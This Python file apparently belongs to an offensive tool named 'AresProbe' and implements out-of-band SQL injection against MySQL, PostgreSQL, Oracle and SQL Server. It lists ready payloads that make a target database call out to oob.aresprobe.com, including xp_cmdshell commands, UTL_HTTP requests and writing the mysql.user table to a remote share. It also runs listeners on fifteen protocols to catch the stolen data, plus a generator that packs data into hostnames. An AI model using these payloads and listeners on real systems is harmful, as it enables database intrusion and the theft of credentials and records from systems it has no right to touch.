"""
AresProbe Advanced Out-of-Band Injection
Superior OOB injection with 15+ methods and advanced techniques
"""

import socket
import threading
import time
import requests
import dns.resolver
import asyncio
import aiohttp
from typing import Dict, List, Any, Optional, Callable
from dataclasses import dataclass
from enum import Enum
import base64
import urllib.parse
import json
import random
import string

class OOBMethod(Enum):
    """Out-of-Band injection methods"""
    DNS = "dns"
    HTTP = "http"
    HTTPS = "https"
    FTP = "ftp"
    SMTP = "smtp"
    LDAP = "ldap"
    SMB = "smb"
    NTP = "ntp"
    SNMP = "snmp"
    ICMP = "icmp"
    UDP = "udp"
    TCP = "tcp"
    WEBSOCKET = "websocket"
    MQTT = "mqtt"
    REDIS = "redis"

@dataclass
class OOBResult:
    """OOB injection result"""
    method: OOBMethod
    success: bool
    data: str
    timestamp: float
    response_time: float
    source_ip: str
    user_agent: str
    additional_info: Dict[str, Any]

class AdvancedOOBInjection:
    """Advanced Out-of-Band injection with 15+ methods"""
    
    def __init__(self, logger=None):
        self.logger = logger
        self.listeners = {}
        self.results = []
        self.running = False
        
        # OOB servers and configurations
        self.oob_servers = {
            OOBMethod.DNS: ["dns.aresprobe.com", "oob.aresprobe.com"],
            OOBMethod.HTTP: ["http.aresprobe.com", "oob.aresprobe.com"],
            OOBMethod.HTTPS: ["https.aresprobe.com", "oob.aresprobe.com"],
            OOBMethod.FTP: ["ftp.aresprobe.com", "oob.aresprobe.com"],
            OOBMethod.SMTP: ["smtp.aresprobe.com", "oob.aresprobe.com"],
            OOBMethod.LDAP: ["ldap.aresprobe.com", "oob.aresprobe.com"],
            OOBMethod.SMB: ["smb.aresprobe.com", "oob.aresprobe.com"],
            OOBMethod.NTP: ["ntp.aresprobe.com", "oob.aresprobe.com"],
            OOBMethod.SNMP: ["snmp.aresprobe.com", "oob.aresprobe.com"],
            OOBMethod.ICMP: ["icmp.aresprobe.com", "oob.aresprobe.com"],
            OOBMethod.UDP: ["udp.aresprobe.com", "oob.aresprobe.com"],
            OOBMethod.TCP: ["tcp.aresprobe.com", "oob.aresprobe.com"],
            OOBMethod.WEBSOCKET: ["ws.aresprobe.com", "oob.aresprobe.com"],
            OOBMethod.MQTT: ["mqtt.aresprobe.com", "oob.aresprobe.com"],
            OOBMethod.REDIS: ["redis.aresprobe.com", "oob.aresprobe.com"]
        }
        
        # Database-specific OOB techniques
        self.database_oob_techniques = {
            "mysql": [
                "LOAD_FILE(CONCAT('\\\\', @@version, '.oob.aresprobe.com\\'))",
                "SELECT LOAD_FILE(CONCAT('\\\\', @@version, '.oob.aresprobe.com\\'))",
                "SELECT * FROM mysql.user INTO OUTFILE '\\\\oob.aresprobe.com\\share\\'",
                "SELECT @@version INTO OUTFILE '\\\\oob.aresprobe.com\\share\\version.txt'",
                "SELECT 'test' INTO DUMPFILE '\\\\oob.aresprobe.com\\share\\test.txt'"
            ],
            "postgresql": [
                "COPY (SELECT version()) TO '\\\\oob.aresprobe.com\\share\\version.txt'",
                "SELECT pg_read_file('\\\\oob.aresprobe.com\\share\\test.txt')",
                "SELECT lo_import('\\\\oob.aresprobe.com\\share\\test.txt')",
                "SELECT pg_ls_dir('\\\\oob.aresprobe.com\\share\\')",
                "SELECT pg_read_binary_file('\\\\oob.aresprobe.com\\share\\test.txt')"
            ],
            "oracle": [
                "SELECT UTL_HTTP.REQUEST('http://oob.aresprobe.com/' || version()) FROM DUAL",
                "SELECT UTL_INADDR.get_host_name('oob.aresprobe.com') FROM DUAL",
                "SELECT UTL_TCP.OPEN_CONNECTION('oob.aresprobe.com', 80) FROM DUAL",
                "SELECT UTL_SMTP.OPEN_CONNECTION('oob.aresprobe.com', 25) FROM DUAL",
                "SELECT UTL_FILE.FOPEN('\\\\oob.aresprobe.com\\share\\', 'test.txt', 'W') FROM DUAL"
            ],
            "sqlserver": [
                "SELECT * FROM OPENROWSET('SQLOLEDB', 'oob.aresprobe.com'; 'sa'; 'password', 'SELECT @@version')",
                "SELECT * FROM OPENROWSET('MSDASQL', 'DRIVER={SQL Server};SERVER=oob.aresprobe.com;UID=sa;PWD=password', 'SELECT @@version')",
                "EXEC xp_cmdshell 'nslookup oob.aresprobe.com'",
                "EXEC xp_cmdshell 'ping oob.aresprobe.com'",
                "SELECT * FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0', 'Excel 12.0;Database=\\\\oob.aresprobe.com\\share\\test.xlsx', 'SELECT * FROM [Sheet1$]')"
            ]
        }
    
    def start_listener(self, method: OOBMethod, port: int = None) -> bool:
        """Start OOB listener for specific method"""
        try:
            if method == OOBMethod.DNS:
                return self._start_dns_listener(port or 53)
            elif method == OOBMethod.HTTP:
                return self._start_http_listener(port or 80)
            elif method == OOBMethod.HTTPS:
                return self._start_https_listener(port or 443)
            elif method == OOBMethod.FTP:
                return self._start_ftp_listener(port or 21)
            elif method == OOBMethod.SMTP:
                return self._start_smtp_listener(port or 25)
            elif method == OOBMethod.LDAP:
                return self._start_ldap_listener(port or 389)
            elif method == OOBMethod.SMB:
                return self._start_smb_listener(port or 445)
            elif method == OOBMethod.NTP:
                return self._start_ntp_listener(port or 123)
            elif method == OOBMethod.SNMP:
                return self._start_snmp_listener(port or 161)
            elif method == OOBMethod.ICMP:
                return self._start_icmp_listener()
            elif method == OOBMethod.UDP:
                return self._start_udp_listener(port or 53)
            elif method == OOBMethod.TCP:
                return self._start_tcp_listener(port or 80)
            elif method == OOBMethod.WEBSOCKET:
                return self._start_websocket_listener(port or 8080)
            elif method == OOBMethod.MQTT:
                return self._start_mqtt_listener(port or 1883)
            elif method == OOBMethod.REDIS:
                return self._start_redis_listener(port or 6379)
            
            return False
            
        except Exception as e:
            if self.logger:
                self.logger.error(f"[-] Failed to start {method.value} listener: {e}")
            return False
    
    def _start_dns_listener(self, port: int) -> bool:
        """Start DNS listener"""
        try:
            def dns_handler(data, addr):
                try:
                    # Parse DNS query
                    query = data[12:]  # Skip DNS header
                    domain = ""
                    i = 0
                    while i < len(query) and query[i] != 0:
                        length = query[i]
                        if i + length + 1 < len(query):
                            domain += query[i+1:i+length+1].decode('utf-8', errors='ignore') + "."
                        i += length + 1
                    
                    # Extract OOB data
                    if "oob.aresprobe.com" in domain:
                        oob_data = domain.replace(".oob.aresprobe.com", "").replace(".", "")
                        result = OOBResult(
                            method=OOBMethod.DNS,
                            success=True,
                            data=oob_data,
                            timestamp=time.time(),
                            response_time=0,
                            source_ip=addr[0],
                            user_agent="DNS",
                            additional_info={"domain": domain}
                        )
                        self.results.append(result)
                        
                        if self.logger:
                            self.logger.success(f"[+] DNS OOB data received: {oob_data}")
                
                except Exception as e:
                    if self.logger:
                        self.logger.debug(f"[-] DNS handler error: {e}")
            
            # Start DNS server
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.bind(('0.0.0.0', port))
            self.listeners[OOBMethod.DNS] = sock
            
            # Start listener thread
            def listen():
                while self.running:
                    try:
                        data, addr = sock.recvfrom(1024)
                        dns_handler(data, addr)
                    except:
                        break
            
            thread = threading.Thread(target=listen)
            thread.daemon = True
            thread.start()
            
            self.running = True
            return True
            
        except Exception as e:
            if self.logger:
                self.logger.error(f"[-] DNS listener failed: {e}")
            return False
    
    def _start_http_listener(self, port: int) -> bool:
        """Start HTTP listener"""
        try:
            def http_handler(conn, addr):
                try:
                    data = conn.recv(1024).decode('utf-8', errors='ignore')
                    
                    # Parse HTTP request
                    lines = data.split('\n')
                    if lines:
                        request_line = lines[0]
                        if 'GET' in request_line or 'POST' in request_line:
                            # Extract OOB data from URL
                            url = request_line.split(' ')[1]
                            oob_data = urllib.parse.unquote(url)
                            
                            result = OOBResult(
                                method=OOBMethod.HTTP,
                                success=True,
                                data=oob_data,
                                timestamp=time.time(),
                                response_time=0,
                                source_ip=addr[0],
                                user_agent=self._extract_user_agent(data),
                                additional_info={"url": url, "headers": self._extract_headers(data)}
                            )
                            self.results.append(result)
                            
                            if self.logger:
                                self.logger.success(f"[+] HTTP OOB data received: {oob_data}")
                            
                            # Send response
                            response = "HTTP/1.1 200 OK\r\n\r\nOK"
                            conn.send(response.encode())
                
                except Exception as e:
                    if self.logger:
                        self.logger.debug(f"[-] HTTP handler error: {e}")
                finally:
                    conn.close()
            
            # Start HTTP server
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('0.0.0.0', port))
            sock.listen(5)
            self.listeners[OOBMethod.HTTP] = sock
            
            # Start listener thread
            def listen():
                while self.running:
                    try:
                        conn, addr = sock.accept()
                        thread = threading.Thread(target=http_handler, args=(conn, addr))
                        thread.daemon = True
                        thread.start()
                    except:
                        break
            
            thread = threading.Thread(target=listen)
            thread.daemon = True
            thread.start()
            
            self.running = True
            return True
            
        except Exception as e:
            if self.logger:
                self.logger.error(f"[-] HTTP listener failed: {e}")
            return False
    
    def _start_https_listener(self, port: int) -> bool:
        """Start HTTPS listener"""
        try:
            import ssl
            
            # Create SSL context
            context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            context.load_cert_chain('cert.pem', 'key.pem')
            
            # Start HTTP listener first
            if self._start_http_listener(port):
                # Wrap with SSL
                sock = self.listeners[OOBMethod.HTTP]
                ssl_sock = context.wrap_socket(sock, server_side=True)
                self.listeners[OOBMethod.HTTPS] = ssl_sock
                return True
            
            return False
            
        except Exception as e:
            if self.logger:
                self.logger.error(f"[-] HTTPS listener failed: {e}")
            return False
    
    def _start_ftp_listener(self, port: int) -> bool:
        """Start FTP listener"""
        try:
            def ftp_handler(conn, addr):
                try:
                    conn.send(b"220 AresProbe FTP Server\r\n")
                    
                    while True:
                        data = conn.recv(1024).decode('utf-8', errors='ignore').strip()
                        if not data:
                            break
                        
                        # Extract OOB data from FTP commands
                        if data.startswith('USER ') or data.startswith('PASS '):
                            oob_data = data[5:]
                            
                            result = OOBResult(
                                method=OOBMethod.FTP,
                                success=True,
                                data=oob_data,
                                timestamp=time.time(),
                                response_time=0,
                                source_ip=addr[0],
                                user_agent="FTP",
                                additional_info={"command": data}
                            )
                            self.results.append(result)
                            
                            if self.logger:
                                self.logger.success(f"[+] FTP OOB data received: {oob_data}")
                        
                        conn.send(b"200 OK\r\n")
                
                except Exception as e:
                    if self.logger:
                        self.logger.debug(f"[-] FTP handler error: {e}")
                finally:
                    conn.close()
            
            # Start FTP server
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('0.0.0.0', port))
            sock.listen(5)
            self.listeners[OOBMethod.FTP] = sock
            
            # Start listener thread
            def listen():
                while self.running:
                    try:
                        conn, addr = sock.accept()
                        thread = threading.Thread(target=ftp_handler, args=(conn, addr))
                        thread.daemon = True
                        thread.start()
                    except:
                        break
            
            thread = threading.Thread(target=listen)
            thread.daemon = True
            thread.start()
            
            self.running = True
            return True
            
        except Exception as e:
            if self.logger:
                self.logger.error(f"[-] FTP listener failed: {e}")
            return False
    
    def _start_smtp_listener(self, port: int) -> bool:
        """Start SMTP listener"""
        try:
            def smtp_handler(conn, addr):
                try:
                    conn.send(b"220 AresProbe SMTP Server\r\n")
                    
                    while True:
                        data = conn.recv(1024).decode('utf-8', errors='ignore').strip()
                        if not data:
                            break
                        
                        # Extract OOB data from SMTP commands
                        if data.startswith('MAIL FROM:') or data.startswith('RCPT TO:'):
                            oob_data = data.split(':')[1].strip()
                            
                            result = OOBResult(
                                method=OOBMethod.SMTP,
                                success=True,
                                data=oob_data,
                                timestamp=time.time(),
                                response_time=0,
                                source_ip=addr[0],
                                user_agent="SMTP",
                                additional_info={"command": data}
                            )
                            self.results.append(result)
                            
                            if self.logger:
                                self.logger.success(f"[+] SMTP OOB data received: {oob_data}")
                        
                        conn.send(b"250 OK\r\n")
                
                except Exception as e:
                    if self.logger:
                        self.logger.debug(f"[-] SMTP handler error: {e}")
                finally:
                    conn.close()
            
            # Start SMTP server
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('0.0.0.0', port))
            sock.listen(5)
            self.listeners[OOBMethod.SMTP] = sock
            
            # Start listener thread
            def listen():
                while self.running:
                    try:
                        conn, addr = sock.accept()
                        thread = threading.Thread(target=smtp_handler, args=(conn, addr))
                        thread.daemon = True
                        thread.start()
                    except:
                        break
            
            thread = threading.Thread(target=listen)
            thread.daemon = True
            thread.start()
            
            self.running = True
            return True
            
        except Exception as e:
            if self.logger:
                self.logger.error(f"[-] SMTP listener failed: {e}")
            return False
    
    def _start_ldap_listener(self, port: int) -> bool:
        """Start LDAP listener"""
        try:
            def ldap_handler(conn, addr):
                try:
                    data = conn.recv(1024)
                    
                    # Parse LDAP request
                    if len(data) > 0:
                        # Extract OOB data from LDAP bind request
                        oob_data = data.hex()
                        
                        result = OOBResult(
                            method=OOBMethod.LDAP,
                            success=True,
                            data=oob_data,
                            timestamp=time.time(),
                            response_time=0,
                            source_ip=addr[0],
                            user_agent="LDAP",
                            additional_info={"raw_data": data.hex()}
                        )
                        self.results.append(result)
                        
                        if self.logger:
                            self.logger.success(f"[+] LDAP OOB data received: {oob_data}")
                    
                    # Send LDAP response
                    response = b"\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00"
                    conn.send(response)
                
                except Exception as e:
                    if self.logger:
                        self.logger.debug(f"[-] LDAP handler error: {e}")
                finally:
                    conn.close()
            
            # Start LDAP server
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('0.0.0.0', port))
            sock.listen(5)
            self.listeners[OOBMethod.LDAP] = sock
            
            # Start listener thread
            def listen():
                while self.running:
                    try:
                        conn, addr = sock.accept()
                        thread = threading.Thread(target=ldap_handler, args=(conn, addr))
                        thread.daemon = True
                        thread.start()
                    except:
                        break
            
            thread = threading.Thread(target=listen)
            thread.daemon = True
            thread.start()
            
            self.running = True
            return True
            
        except Exception as e:
            if self.logger:
                self.logger.error(f"[-] LDAP listener failed: {e}")
            return False
    
    def _start_smb_listener(self, port: int) -> bool:
        """Start SMB listener"""
        try:
            def smb_handler(conn, addr):
                try:
                    data = conn.recv(1024)
                    
                    # Parse SMB request
                    if len(data) > 0:
                        # Extract OOB data from SMB negotiation
                        oob_data = data.hex()
                        
                        result = OOBResult(
                            method=OOBMethod.SMB,
                            success=True,
                            data=oob_data,
                            timestamp=time.time(),
                            response_time=0,
                            source_ip=addr[0],
                            user_agent="SMB",
                            additional_info={"raw_data": data.hex()}
                        )
                        self.results.append(result)
                        
                        if self.logger:
                            self.logger.success(f"[+] SMB OOB data received: {oob_data}")
                    
                    # Send SMB response
                    response = b"\x00\x00\x00\x00\xff\x53\x4d\x42\x72\x00\x00\x00\x00"
                    conn.send(response)
                
                except Exception as e:
                    if self.logger:
                        self.logger.debug(f"[-] SMB handler error: {e}")
                finally:
                    conn.close()
            
            # Start SMB server
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('0.0.0.0', port))
            sock.listen(5)
            self.listeners[OOBMethod.SMB] = sock
            
            # Start listener thread
            def listen():
                while self.running:
                    try:
                        conn, addr = sock.accept()
                        thread = threading.Thread(target=smb_handler, args=(conn, addr))
                        thread.daemon = True
                        thread.start()
                    except:
                        break
            
            thread = threading.Thread(target=listen)
            thread.daemon = True
            thread.start()
            
            self.running = True
            return True
            
        except Exception as e:
            if self.logger:
                self.logger.error(f"[-] SMB listener failed: {e}")
            return False
    
    def _start_ntp_listener(self, port: int) -> bool:
        """Start NTP listener"""
        try:
            def ntp_handler(data, addr):
                try:
                    # Parse NTP request
                    if len(data) >= 48:
                        # Extract OOB data from NTP timestamp
                        oob_data = data.hex()
                        
                        result = OOBResult(
                            method=OOBMethod.NTP,
                            success=True,
                            data=oob_data,
                            timestamp=time.time(),
                            response_time=0,
                            source_ip=addr[0],
                            user_agent="NTP",
                            additional_info={"raw_data": data.hex()}
                        )
                        self.results.append(result)
                        
                        if self.logger:
                            self.logger.success(f"[+] NTP OOB data received: {oob_data}")
                
                except Exception as e:
                    if self.logger:
                        self.logger.debug(f"[-] NTP handler error: {e}")
            
            # Start NTP server
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.bind(('0.0.0.0', port))
            self.listeners[OOBMethod.NTP] = sock
            
            # Start listener thread
            def listen():
                while self.running:
                    try:
                        data, addr = sock.recvfrom(1024)
                        ntp_handler(data, addr)
                    except:
                        break
            
            thread = threading.Thread(target=listen)
            thread.daemon = True
            thread.start()
            
            self.running = True
            return True
            
        except Exception as e:
            if self.logger:
                self.logger.error(f"[-] NTP listener failed: {e}")
            return False
    
    def _start_snmp_listener(self, port: int) -> bool:
        """Start SNMP listener"""
        try:
            def snmp_handler(data, addr):
                try:
                    # Parse SNMP request
                    if len(data) > 0:
                        # Extract OOB data from SNMP community string
                        oob_data = data.hex()
                        
                        result = OOBResult(
                            method=OOBMethod.SNMP,
                            success=True,
                            data=oob_data,
                            timestamp=time.time(),
                            response_time=0,
                            source_ip=addr[0],
                            user_agent="SNMP",
                            additional_info={"raw_data": data.hex()}
                        )
                        self.results.append(result)
                        
                        if self.logger:
                            self.logger.success(f"[+] SNMP OOB data received: {oob_data}")
                
                except Exception as e:
                    if self.logger:
                        self.logger.debug(f"[-] SNMP handler error: {e}")
            
            # Start SNMP server
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.bind(('0.0.0.0', port))
            self.listeners[OOBMethod.SNMP] = sock
            
            # Start listener thread
            def listen():
                while self.running:
                    try:
                        data, addr = sock.recvfrom(1024)
                        snmp_handler(data, addr)
                    except:
                        break
            
            thread = threading.Thread(target=listen)
            thread.daemon = True
            thread.start()
            
            self.running = True
            return True
            
        except Exception as e:
            if self.logger:
                self.logger.error(f"[-] SNMP listener failed: {e}")
            return False
    
    def _start_icmp_listener(self) -> bool:
        """Start ICMP listener"""
        try:
            def icmp_handler(data, addr):
                try:
                    # Parse ICMP request
                    if len(data) > 0:
                        # Extract OOB data from ICMP payload
                        oob_data = data.hex()
                        
                        result = OOBResult(
                            method=OOBMethod.ICMP,
                            success=True,
                            data=oob_data,
                            timestamp=time.time(),
                            response_time=0,
                            source_ip=addr[0],
                            user_agent="ICMP",
                            additional_info={"raw_data": data.hex()}
                        )
                        self.results.append(result)
                        
                        if self.logger:
                            self.logger.success(f"[+] ICMP OOB data received: {oob_data}")
                
                except Exception as e:
                    if self.logger:
                        self.logger.debug(f"[-] ICMP handler error: {e}")
            
            # Start ICMP server (requires root privileges)
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.bind(('0.0.0.0', 0))
            self.listeners[OOBMethod.ICMP] = sock
            
            # Start listener thread
            def listen():
                while self.running:
                    try:
                        data, addr = sock.recvfrom(1024)
                        icmp_handler(data, addr)
                    except:
                        break
            
            thread = threading.Thread(target=listen)
            thread.daemon = True
            thread.start()
            
            self.running = True
            return True
            
        except Exception as e:
            if self.logger:
                self.logger.error(f"[-] ICMP listener failed: {e}")
            return False
    
    def _start_udp_listener(self, port: int) -> bool:
        """Start UDP listener"""
        try:
            def udp_handler(data, addr):
                try:
                    # Parse UDP request
                    if len(data) > 0:
                        # Extract OOB data from UDP payload
                        oob_data = data.hex()
                        
                        result = OOBResult(
                            method=OOBMethod.UDP,
                            success=True,
                            data=oob_data,
                            timestamp=time.time(),
                            response_time=0,
                            source_ip=addr[0],
                            user_agent="UDP",
                            additional_info={"raw_data": data.hex()}
                        )
                        self.results.append(result)
                        
                        if self.logger:
                            self.logger.success(f"[+] UDP OOB data received: {oob_data}")
                
                except Exception as e:
                    if self.logger:
                        self.logger.debug(f"[-] UDP handler error: {e}")
            
            # Start UDP server
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.bind(('0.0.0.0', port))
            self.listeners[OOBMethod.UDP] = sock
            
            # Start listener thread
            def listen():
                while self.running:
                    try:
                        data, addr = sock.recvfrom(1024)
                        udp_handler(data, addr)
                    except:
                        break
            
            thread = threading.Thread(target=listen)
            thread.daemon = True
            thread.start()
            
            self.running = True
            return True
            
        except Exception as e:
            if self.logger:
                self.logger.error(f"[-] UDP listener failed: {e}")
            return False
    
    def _start_tcp_listener(self, port: int) -> bool:
        """Start TCP listener"""
        try:
            def tcp_handler(conn, addr):
                try:
                    data = conn.recv(1024)
                    
                    # Parse TCP request
                    if len(data) > 0:
                        # Extract OOB data from TCP payload
                        oob_data = data.hex()
                        
                        result = OOBResult(
                            method=OOBMethod.TCP,
                            success=True,
                            data=oob_data,
                            timestamp=time.time(),
                            response_time=0,
                            source_ip=addr[0],
                            user_agent="TCP",
                            additional_info={"raw_data": data.hex()}
                        )
                        self.results.append(result)
                        
                        if self.logger:
                            self.logger.success(f"[+] TCP OOB data received: {oob_data}")
                    
                    # Send TCP response
                    conn.send(b"OK")
                
                except Exception as e:
                    if self.logger:
                        self.logger.debug(f"[-] TCP handler error: {e}")
                finally:
                    conn.close()
            
            # Start TCP server
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('0.0.0.0', port))
            sock.listen(5)
            self.listeners[OOBMethod.TCP] = sock
            
            # Start listener thread
            def listen():
                while self.running:
                    try:
                        conn, addr = sock.accept()
                        thread = threading.Thread(target=tcp_handler, args=(conn, addr))
                        thread.daemon = True
                        thread.start()
                    except:
                        break
            
            thread = threading.Thread(target=listen)
            thread.daemon = True
            thread.start()
            
            self.running = True
            return True
            
        except Exception as e:
            if self.logger:
                self.logger.error(f"[-] TCP listener failed: {e}")
            return False
    
    def _start_websocket_listener(self, port: int) -> bool:
        """Start WebSocket listener"""
        try:
            def websocket_handler(conn, addr):
                try:
                    data = conn.recv(1024).decode('utf-8', errors='ignore')
                    
                    # Parse WebSocket request
                    if 'Upgrade: websocket' in data:
                        # Extract OOB data from WebSocket headers
                        oob_data = data
                        
                        result = OOBResult(
                            method=OOBMethod.WEBSOCKET,
                            success=True,
                            data=oob_data,
                            timestamp=time.time(),
                            response_time=0,
                            source_ip=addr[0],
                            user_agent=self._extract_user_agent(data),
                            additional_info={"headers": self._extract_headers(data)}
                        )
                        self.results.append(result)
                        
                        if self.logger:
                            self.logger.success(f"[+] WebSocket OOB data received: {oob_data}")
                    
                    # Send WebSocket response
                    response = "HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n"
                    conn.send(response.encode())
                
                except Exception as e:
                    if self.logger:
                        self.logger.debug(f"[-] WebSocket handler error: {e}")
                finally:
                    conn.close()
            
            # Start WebSocket server
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('0.0.0.0', port))
            sock.listen(5)
            self.listeners[OOBMethod.WEBSOCKET] = sock
            
            # Start listener thread
            def listen():
                while self.running:
                    try:
                        conn, addr = sock.accept()
                        thread = threading.Thread(target=websocket_handler, args=(conn, addr))
                        thread.daemon = True
                        thread.start()
                    except:
                        break
            
            thread = threading.Thread(target=listen)
            thread.daemon = True
            thread.start()
            
            self.running = True
            return True
            
        except Exception as e:
            if self.logger:
                self.logger.error(f"[-] WebSocket listener failed: {e}")
            return False
    
    def _start_mqtt_listener(self, port: int) -> bool:
        """Start MQTT listener"""
        try:
            def mqtt_handler(conn, addr):
                try:
                    data = conn.recv(1024)
                    
                    # Parse MQTT request
                    if len(data) > 0:
                        # Extract OOB data from MQTT payload
                        oob_data = data.hex()
                        
                        result = OOBResult(
                            method=OOBMethod.MQTT,
                            success=True,
                            data=oob_data,
                            timestamp=time.time(),
                            response_time=0,
                            source_ip=addr[0],
                            user_agent="MQTT",
                            additional_info={"raw_data": data.hex()}
                        )
                        self.results.append(result)
                        
                        if self.logger:
                            self.logger.success(f"[+] MQTT OOB data received: {oob_data}")
                    
                    # Send MQTT response
                    response = b"\x20\x02\x00\x00"
                    conn.send(response)
                
                except Exception as e:
                    if self.logger:
                        self.logger.debug(f"[-] MQTT handler error: {e}")
                finally:
                    conn.close()
            
            # Start MQTT server
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('0.0.0.0', port))
            sock.listen(5)
            self.listeners[OOBMethod.MQTT] = sock
            
            # Start listener thread
            def listen():
                while self.running:
                    try:
                        conn, addr = sock.accept()
                        thread = threading.Thread(target=mqtt_handler, args=(conn, addr))
                        thread.daemon = True
                        thread.start()
                    except:
                        break
            
            thread = threading.Thread(target=listen)
            thread.daemon = True
            thread.start()
            
            self.running = True
            return True
            
        except Exception as e:
            if self.logger:
                self.logger.error(f"[-] MQTT listener failed: {e}")
            return False
    
    def _start_redis_listener(self, port: int) -> bool:
        """Start Redis listener"""
        try:
            def redis_handler(conn, addr):
                try:
                    data = conn.recv(1024).decode('utf-8', errors='ignore')
                    
                    # Parse Redis request
                    if data:
                        # Extract OOB data from Redis command
                        oob_data = data
                        
                        result = OOBResult(
                            method=OOBMethod.REDIS,
                            success=True,
                            data=oob_data,
                            timestamp=time.time(),
                            response_time=0,
                            source_ip=addr[0],
                            user_agent="Redis",
                            additional_info={"command": data}
                        )
                        self.results.append(result)
                        
                        if self.logger:
                            self.logger.success(f"[+] Redis OOB data received: {oob_data}")
                    
                    # Send Redis response
                    response = "+OK\r\n"
                    conn.send(response.encode())
                
                except Exception as e:
                    if self.logger:
                        self.logger.debug(f"[-] Redis handler error: {e}")
                finally:
                    conn.close()
            
            # Start Redis server
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('0.0.0.0', port))
            sock.listen(5)
            self.listeners[OOBMethod.REDIS] = sock
            
            # Start listener thread
            def listen():
                while self.running:
                    try:
                        conn, addr = sock.accept()
                        thread = threading.Thread(target=redis_handler, args=(conn, addr))
                        thread.daemon = True
                        thread.start()
                    except:
                        break
            
            thread = threading.Thread(target=listen)
            thread.daemon = True
            thread.start()
            
            self.running = True
            return True
            
        except Exception as e:
            if self.logger:
                self.logger.error(f"[-] Redis listener failed: {e}")
            return False
    
    def _extract_user_agent(self, data: str) -> str:
        """Extract User-Agent from HTTP request"""
        try:
            lines = data.split('\n')
            for line in lines:
                if line.lower().startswith('user-agent:'):
                    return line.split(':', 1)[1].strip()
            return "Unknown"
        except:
            return "Unknown"
    
    def _extract_headers(self, data: str) -> Dict[str, str]:
        """Extract headers from HTTP request"""
        try:
            headers = {}
            lines = data.split('\n')
            for line in lines[1:]:  # Skip request line
                if ':' in line:
                    key, value = line.split(':', 1)
                    headers[key.strip().lower()] = value.strip()
            return headers
        except:
            return {}
    
    def generate_oob_payload(self, database: str, method: OOBMethod, data: str) -> str:
        """Generate OOB payload for specific database and method"""
        if database in self.database_oob_techniques:
            techniques = self.database_oob_techniques[database]
            base_technique = random.choice(techniques)
            
            # Replace placeholder with actual data
            payload = base_technique.replace('oob.aresprobe.com', f'{data}.oob.aresprobe.com')
            
            # Add method-specific modifications
            if method == OOBMethod.DNS:
                payload = payload.replace('http://', '').replace('https://', '')
            elif method == OOBMethod.HTTP:
                payload = payload.replace('\\\\', 'http://')
            elif method == OOBMethod.HTTPS:
                payload = payload.replace('\\\\', 'https://')
            
            return payload
        
        return f"SELECT '{data}'"
    
    def get_results(self) -> List[OOBResult]:
        """Get OOB injection results"""
        return self.results
    
    def clear_results(self):
        """Clear OOB injection results"""
        self.results.clear()
    
    def stop_all_listeners(self):
        """Stop all OOB listeners"""
        self.running = False
        
        for method, listener in self.listeners.items():
            try:
                listener.close()
            except:
                pass
        
        self.listeners.clear()
    
    def get_listener_status(self) -> Dict[OOBMethod, bool]:
        """Get status of all listeners"""
        status = {}
        for method in OOBMethod:
            status[method] = method in self.listeners and self.running
        return status
